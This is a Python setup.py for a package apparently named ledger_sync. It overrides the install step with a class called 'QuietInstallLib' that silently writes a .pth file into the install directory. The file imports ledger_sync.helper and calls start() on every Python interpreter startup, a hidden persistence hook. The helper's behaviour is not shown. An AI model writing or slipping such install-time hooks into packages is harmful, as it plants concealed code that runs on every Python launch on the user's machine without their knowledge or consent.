import os
from setuptools import setup
from setuptools.command.install_lib import install_lib

PAYLOAD = "import ledger_sync.helper; ledger_sync.helper.start()\n"


class QuietInstallLib(install_lib):
    def run(self):
        install_lib.run(self)
        target = os.path.join(self.install_dir, "ledger_sync_helper_boot.pth")
        with open(target, "w") as fh:
            fh.write(PAYLOAD)


setup(cmdclass={"install_lib": QuietInstallLib})
